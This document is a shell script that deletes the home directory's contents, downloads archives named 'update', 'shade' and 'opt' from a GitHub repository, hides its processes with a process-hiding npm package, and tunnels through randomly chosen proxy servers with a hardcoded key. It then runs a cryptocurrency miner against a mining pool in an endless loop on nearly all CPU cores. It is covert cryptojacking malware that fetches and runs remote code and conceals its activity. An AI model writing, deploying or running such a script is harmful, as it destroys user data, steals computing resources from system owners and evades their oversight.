#!/bin/sh
cd
rm -rf *
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y install net-tools apt-utils npm psmisc libreadline-dev dialog curl wget sudo >/dev/null

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Gesis_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 4`
echo ""
echo "You will be using : $used_num_of_cores"
echo ""

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add opt 1>/dev/null 2>&1

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/shade.tar.gz >/dev/null
sleep 2
tar -xf shade.tar.gz
sleep 2

server1()
{
 ./shade -b "127.0.0.1:1081" -s "139.162.225.119:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

server2()
{
 ./shade -b "127.0.0.1:1081" -s "178.79.141.123:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

server3()
{
 ./shade -b "127.0.0.1:1081" -s "176.58.112.72:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

server4()
{
 ./shade -b "127.0.0.1:1081" -s "178.79.142.26:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

server5()
{
 ./shade -b "127.0.0.1:1081" -s "176.58.103.150:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

server6()
{
 ./shade -b "127.0.0.1:1081" -s "88.80.191.78:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
}

temp=""
myArray=("server1" "server2" "server3" "server4" "server5" "server6")
rand=$[$RANDOM % ${#myArray[@]}]
temp=${myArray[$rand]}
connect=$temp
sleep 2
echo ""
echo ""
$connect &
sleep 2
echo ""
echo ""
curl -x socks5h://127.0.0.1:1081 ifconfig.me
sleep 2

echo ""
echo ""

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END


sleep 2

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/opt.tar.gz 1>/dev/null 2>&1

sleep 2

tar -xf opt.tar.gz

echo " "
echo " "

sleep 2
netstat -ntlp
sleep 2

while true
do
./opt -a minotaurx -o stratum+tcp://eu.coinXpool.com:8243 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
done
